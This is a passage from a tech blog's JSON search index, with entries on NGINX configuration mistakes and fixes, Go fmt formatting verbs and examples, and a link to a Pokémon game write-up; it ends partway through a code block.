学习笔记"},{"categories":["URL","Pokemon","Arceus","Game"],"contents":" 《宝可梦：阿尔宙斯》双周目通关 ","date":"September 19, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220919-pokemon-legends-arceus-stage-clear/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://soulteary.com/2022/09/05/pokemon-legends-arceus-stage-clear.html\" target=\"_blank\" rel=\"noopener\"\u003e《宝可梦：阿尔宙斯》双周目通关\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Pokemon","Arceus","Game"],"title":"《宝可梦：阿尔宙斯》双周目通关"},{"categories":["URL","NGINX"],"contents":" Avoiding the Top 10 NGINX Configuration Mistakes - NGINX 1) Not enough file descriptors (FDs) per worker What\u0026rsquo;s wrong worker_connections limits how many concurrent connections a single worker can hold (default 512). But each worker is also limited by the OS per-process file descriptor limit (often 1024 by default). Common mistake: increasing worker_connections but not raising the FD limit, causing early exhaustion. Fix Set worker_rlimit_nofile in the main context to at least 2× worker_connections (rule of thumb). Also validate the system-wide FD cap (fs.file-max) so that: worker_rlimit_nofile * worker_processes is well below fs.file-max. # main context worker_connections 1024; # inside events {} worker_rlimit_nofile 2048; # main context 2) The error_log off directive (it does not disable error logging) What\u0026rsquo;s wrong Unlike access_log, error_log does not accept an off parameter. error_log off; creates a file literally named off (often under /etc/nginx/). Fix (generally not recommended) If you must suppress error logging due to storage constraints, send it to /dev/null and restrict severity: # main context error_log /dev/null emerg; Note This only applies after NGINX reads and validates config; startup/reload may still log to the default location unless you start NGINX with -e \u0026lt;error_log_location\u0026gt;. 3) Not enabling keepalive connections to upstream servers What\u0026rsquo;s wrong Default behavior: NGINX opens a new upstream connection for each request. At high load this can consume resources and can exhaust ephemeral source ports due to TIME-WAIT, preventing new upstream connections. Fix (A) Add keepalive to each upstream {}\nThe value is the number of idle keepalive connections cached per worker (not a global cap). Practical guidance: about 2× the number of servers in the upstream group. upstream backend { # If you use a load-balancing method (hash/ip_hash/least_conn/least_time/random), # it must appear above keepalive (rare ordering exception). least_conn; server 10.0.0.11:8080; server 10.0.0.12:8080; keepalive 4; # ~ 2 * servers } (B) Ensure upstream uses HTTP/1.1 and remove Connection: close\nlocation / { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; } 4) Forgetting directive inheritance and override behavior (especially \u0026ldquo;array\u0026rdquo; directives) Key rule Directives inherit \u0026ldquo;outside-in\u0026rdquo; (parent → child). If the same directive appears in a child context, it overrides the parent, it does not \u0026ldquo;add to\u0026rdquo; it. Easy to get wrong: add_header, proxy_set_header, etc. Example (a location-level add_header overrides all inherited add_headers) http { add_header X-HTTP-LEVEL-HEADER 1; add_header X-ANOTHER-HTTP-LEVEL-HEADER 1; server { listen 8081; add_header X-SERVER-LEVEL-HEADER 1; location /test { add_header X-LOCATION-LEVEL-HEADER 1; return 200 \u0026#34;OK\u0026#34;; } location /correct { # Re-declare everything you want to keep add_header X-HTTP-LEVEL-HEADER 1; add_header X-ANOTHER-HTTP-LEVEL-HEADER 1; add_header X-SERVER-LEVEL-HEADER 1; add_header X-LOCATION-LEVEL-HEADER 1; return 200 \u0026#34;OK\u0026#34;; } } } 5) The proxy_buffering off directive (often harmful) What\u0026rsquo;s wrong Default is proxy_buffering on. NGINX buffers upstream responses and then serves slow clients efficiently. With buffering off, NGINX starts streaming after a tiny initial buffer, forcing upstream servers to wait for slow clients; throughput drops. Side effects include degraded performance and certain features (like caching/rate limiting) not working as intended. Recommendation Avoid turning buffering off except for narrow use cases (e.g., some long-polling scenarios). # Not recommended in general: proxy_buffering off; # Keep default: proxy_buffering on; 6) Improper use of the if directive (especially inside location {}) What\u0026rsquo;s wrong if is notoriously tricky in NGINX; behavior is often surprising and can be unsafe in complex cases. The reliably safe directives inside if are typically return and rewrite. Safer pattern: if + error_page for steering location / { error_page 430 = @error_430; if ($http_x_test) { return 430; } proxy_pass http://a; } location @error_430 { proxy_pass http://b; } Prefer map to avoid if map $http_x_test $upstream_name { default \u0026#34;b\u0026#34;; \u0026#34;\u0026#34; \u0026#34;a\u0026#34;; } location / { proxy_pass http://$upstream_name; } 7) Excessive health checks What\u0026rsquo;s wrong If multiple virtual servers proxy to the same upstream group, placing health_check in each server block duplicates probes, increases upstream load, and provides no extra value. Fix Define one health check per upstream group (e.g., a named location), and centralize management. location / { proxy_set_header Host $host; proxy_set_header Connection \u0026#34;\u0026#34;; proxy_http_version 1.1; proxy_pass http://b; } location @health_check { health_check; proxy_connect_timeout 2s; proxy_read_timeout 3s; proxy_set_header Host example.com; proxy_pass http://b; } Optional: central \u0026ldquo;monitoring\u0026rdquo; server (health checks + API/dashboard) server { listen 8080; location @health_check_b { health_check; proxy_connect_timeout 2s; proxy_read_timeout 3s; proxy_set_header Host example.com; proxy_pass http://b; } location /api { api write=on; # NGINX Plus # Restrict access (see #8) } location = /dashboard.html { root /usr/share/nginx/html; } } 8) Unsecured access to metrics endpoints What\u0026rsquo;s wrong stub_status (Open Source) and the NGINX Plus api can expose operational details that may aid attackers. Common mistake: exposing the endpoint publicly. Fix option A: HTTP Basic Auth location = /basic_status { auth_basic \u0026#34;closed site\u0026#34;; auth_basic_user_file conf.d/.htpasswd; stub_status; } Fix option B: allow / deny IP restrictions location = /basic_status { allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; allow 96.1.2.23/32; deny all; stub_status; } Combine both: satisfy any location = /basic_status { satisfy any; auth_basic \u0026#34;closed site\u0026#34;; auth_basic_user_file conf.d/.htpasswd; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; allow 96.1.2.23/32; deny all; stub_status; } 9) Using ip_hash when all traffic appears from the same /24 CIDR block What\u0026rsquo;s wrong ip_hash uses the first three octets of IPv4 (effectively /24) as the hash key, or the full IPv6 address. If upstream traffic is \u0026ldquo;fronted\u0026rdquo; by devices all in the same /24, NGINX sees the same first three octets for all clients → same hash key → no distribution. Fix Use hash $binary_remote_addr for a full-address key. Use consistent (ketama) to reduce remapping when the server set changes. upstream backend { hash $binary_remote_addr consistent; server 10.10.20.105:8080; server 10.10.20.106:8080; server 10.10.20.108:8080; } 10) Not taking advantage of upstream groups (even with a single backend) What\u0026rsquo;s wrong Writing proxy_pass http://host:port directly is common for a single backend. But defining an upstream {} unlocks better connection reuse, health tuning, failover behavior, and observability. Improved pattern (example) upstream node_backend { zone upstreams 64K; # shared memory zone server 127.0.0.1:3000 max_fails=1 fail_timeout=2s; keepalive 2; } server { listen 80; server_name example.com; location / { proxy_set_header Host $host; proxy_pass http://node_backend/; proxy_next_upstream error timeout http_500; } } Notes zone: shares upstream state across workers; in NGINX Plus it also enables API-driven changes without restart. max_fails/fail_timeout: tighter unhealthy detection behavior (example shown). proxy_next_upstream: declares which conditions trigger trying the \u0026ldquo;next\u0026rdquo; server (here includes http_500). ","date":"September 16, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220916-avoiding-top-10-nginx-configuration-mistakes/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.nginx.com/blog/avoiding-top-10-nginx-configuration-mistakes/\" target=\"_blank\" rel=\"noopener\"\u003eAvoiding the Top 10 NGINX Configuration Mistakes - NGINX\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"1-not-enough-file-descriptors-fds-per-worker\"\u003e1) Not enough file descriptors (FDs) per worker\u003c/h2\u003e\n\u003ch3 id=\"whats-wrong\"\u003eWhat\u0026rsquo;s wrong\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eworker_connections\u003c/code\u003e limits how many concurrent connections \u003cstrong\u003ea single worker\u003c/strong\u003e can hold (default 512).\u003c/li\u003e\n\u003cli\u003eBut each worker is also limited by the OS per-process \u003cstrong\u003efile descriptor\u003c/strong\u003e limit (often 1024 by default).\u003c/li\u003e\n\u003cli\u003eCommon mistake: increasing \u003ccode\u003eworker_connections\u003c/code\u003e but not raising the FD limit, causing early exhaustion.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"fix\"\u003eFix\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSet \u003ccode\u003eworker_rlimit_nofile\u003c/code\u003e in the \u003cstrong\u003emain context\u003c/strong\u003e to at least \u003cstrong\u003e2×\u003c/strong\u003e \u003ccode\u003eworker_connections\u003c/code\u003e (rule of thumb).\u003c/li\u003e\n\u003cli\u003eAlso validate the system-wide FD cap (\u003ccode\u003efs.file-max\u003c/code\u003e) so that:\n\u003ccode\u003eworker_rlimit_nofile * worker_processes\u003c/code\u003e is well below \u003ccode\u003efs.file-max\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_connections\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;      \u003cspan style=\"color:#75715e\"\u003e# inside events {}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_rlimit_nofile\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;     \u003cspan style=\"color:#75715e\"\u003e# main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"2-the-error_log-off-directive-it-does-not-disable-error-logging\"\u003e2) The \u003ccode\u003eerror_log off\u003c/code\u003e directive (it does not disable error logging)\u003c/h2\u003e\n\u003ch3 id=\"whats-wrong-1\"\u003eWhat\u0026rsquo;s wrong\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUnlike \u003ccode\u003eaccess_log\u003c/code\u003e, \u003ccode\u003eerror_log\u003c/code\u003e does \u003cstrong\u003enot\u003c/strong\u003e accept an \u003ccode\u003eoff\u003c/code\u003e parameter.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eerror_log off;\u003c/code\u003e creates a file literally named \u003ccode\u003eoff\u003c/code\u003e (often under \u003ccode\u003e/etc/nginx/\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"fix-generally-not-recommended\"\u003eFix (generally not recommended)\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIf you must suppress error logging due to storage constraints, send it to \u003ccode\u003e/dev/null\u003c/code\u003e and restrict severity:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# main context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/dev/null\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eemerg\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"note\"\u003eNote\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThis only applies after NGINX reads and validates config; startup/reload may still log to the default location unless you start NGINX with \u003ccode\u003e-e \u0026lt;error_log_location\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"3-not-enabling-keepalive-connections-to-upstream-servers\"\u003e3) Not enabling keepalive connections to upstream servers\u003c/h2\u003e\n\u003ch3 id=\"whats-wrong-2\"\u003eWhat\u0026rsquo;s wrong\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDefault behavior: NGINX opens a new upstream connection for each request.\u003c/li\u003e\n\u003cli\u003eAt high load this can consume resources and can exhaust ephemeral source ports due to TIME-WAIT, preventing new upstream connections.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"fix-1\"\u003eFix\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e(A) Add \u003ccode\u003ekeepalive\u003c/code\u003e to each \u003ccode\u003eupstream {}\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e","tags":["URL","NGINX"],"title":"Avoiding the Top 10 NGINX Configuration Mistakes - NGINX"},{"categories":["URL","Go"],"contents":" Go string format The verb at the end defines the type and the interpretation of its corresponding argument.\nd - decimal integer o - octal integer O - octal integer with 0o prefix b - binary integer x - hexadecimal integer lowercase X - hexadecimal integer uppercase f - decimal floating point, lowercase F - decimal floating point, uppercase e - scientific notation (mantissa/exponent), lowercase E - scientific notation (mantissa/exponent), uppercase g - the shortest representation of %e or %f G - the shortest representation of %E or %F c - a character represented by the corresponding Unicode code point q - a quoted character U - Unicode escape sequence t - the word true or false s - a string v - default format #v - Go-syntax representation of the value T - a Go-syntax representation of the type of the value p - pointer address % - a double %% prints a single % Go string format indexing package main import ( \u0026#34;fmt\u0026#34; ) func main() { n1 := 2 n2 := 3 n3 := 4 res := fmt.Sprintf(\u0026#34;There are %d oranges %d apples %d plums\u0026#34;, n1, n2, n3) fmt.Println(res) // There are 2 oranges 3 apples 4 plums res2 := fmt.Sprintf(\u0026#34;There are %[2]d oranges %d apples %[1]d plums\u0026#34;, n1, n2, n3) fmt.Println(res2) // There are 3 oranges 4 apples 2 plums } Go string format precision package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Printf(\u0026#34;%0.f\\n\u0026#34;, 16.540) // 17 fmt.Printf(\u0026#34;%0.2f\\n\u0026#34;, 16.540) // 16.54 fmt.Printf(\u0026#34;%0.3f\\n\u0026#34;, 16.540) // 16.540 fmt.Printf(\u0026#34;%0.5f\\n\u0026#34;, 16.540) // 16.54000 } Go string format flags package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Printf(\u0026#34;%+d\\n\u0026#34;, 1691) // +1691 fmt.Printf(\u0026#34;%#x\\n\u0026#34;, 1691) // 0x69b fmt.Printf(\u0026#34;%#X\\n\u0026#34;, 1691) // 0X69B fmt.Printf(\u0026#34;%#b\\n\u0026#34;, 1691) // 0b11010011011 fmt.Printf(\u0026#34;%10d\\n\u0026#34;, 1691) // 1691 fmt.Printf(\u0026#34;%-10d\\n\u0026#34;, 1691) // 1691 fmt.Printf(\u0026#34;%010d\\n\u0026#34;, 1691) // 0000001691 } Go string format width package main import ( \u0026#34;fmt\u0026#34; ) func main() { w := \u0026#34;falcon\u0026#34; n := 122 h := 455.67 fmt.Printf(\u0026#34;%s\\n\u0026#34;, w) // falcon fmt.Printf(\u0026#34;%10s\\n\u0026#34;, w) // falcon fmt.Printf(\u0026#34;%d\\n\u0026#34;, n). // 122 fmt.Printf(\u0026#34;%7d\\n\u0026#34;, n) // 122 fmt.Printf(\u0026#34;%07d\\n\u0026#34;, n) // 0000122 fmt.Printf(\u0026#34;%10f\\n\u0026#34;, h) // 455.670000 fmt.Printf(\u0026#34;%11f\\n\u0026#34;, h) // 455.670000 fmt.Printf(\u0026#34;%12f\\n\u0026#34;, h) // 455.670000 } ","date":"September 8, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220908-string-format/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://zetcode.com/golang/string-format/\" target=\"_blank\" rel=\"noopener\"\u003eGo string format\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe verb at the end defines the type and the interpretation of its corresponding argument.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ed\u003c/code\u003e - decimal integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eo\u003c/code\u003e - octal integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eO\u003c/code\u003e - octal integer with \u003ccode\u003e0o\u003c/code\u003e prefix\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eb\u003c/code\u003e - binary integer\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ex\u003c/code\u003e - hexadecimal integer lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eX\u003c/code\u003e - hexadecimal integer uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ef\u003c/code\u003e - decimal floating point, lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eF\u003c/code\u003e - decimal floating point, uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ee\u003c/code\u003e - scientific notation (mantissa/exponent), lowercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eE\u003c/code\u003e - scientific notation (mantissa/exponent), uppercase\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eg\u003c/code\u003e - the shortest representation of \u003ccode\u003e%e\u003c/code\u003e or \u003ccode\u003e%f\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eG\u003c/code\u003e - the shortest representation of \u003ccode\u003e%E\u003c/code\u003e or \u003ccode\u003e%F\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ec\u003c/code\u003e - a character represented by the corresponding Unicode code point\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eq\u003c/code\u003e - a quoted character\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eU\u003c/code\u003e - Unicode escape sequence\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003et\u003c/code\u003e - the word true or false\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003es\u003c/code\u003e - a string\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ev\u003c/code\u003e - default format\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e#v\u003c/code\u003e - Go-syntax representation of the value\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eT\u003c/code\u003e - a Go-syntax representation of the type of the value\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ep\u003c/code\u003e - pointer address\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%\u003c/code\u003e - a double \u003ccode\u003e%%\u003c/code\u003e prints a single \u003ccode\u003e%\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"go-string-format-indexing\"\u003eGo string format indexing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;There are %d oranges %d apples %d plums\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// There are 2 oranges 3 apples 4 plums\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eres2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;There are %[2]d oranges %d apples %[1]d plums\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eres2\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// There are 3 oranges 4 apples 2 plums\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-precision\"\u003eGo string format precision\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 17\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.2f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.54\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.3f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.540\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.5f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.54000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-flags\"\u003eGo string format flags\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() 